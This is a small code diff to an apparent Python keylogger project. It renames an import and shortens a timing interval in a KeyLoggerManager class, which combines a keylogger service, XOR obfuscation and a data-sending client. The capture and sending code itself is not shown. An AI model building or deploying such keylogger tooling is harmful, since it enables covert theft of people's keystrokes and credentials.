@@ -1,6 +1,6 @@
 from EncryptedXor import EncryptedXor
 from KeyLoggerService import KeyLoggerService
-from ClientSide import SendData
+from clientSide import SendData
 from datetime import datetime
 import time
 
@@ -9,7 +9,7 @@ class KeyLoggerManager:
       def __init__(self):
           self.start=KeyLoggerService()
           self.send_client=SendData()
-          self.TIME=30
+          self.TIME=10
           self.xor = EncryptedXor()
 
 
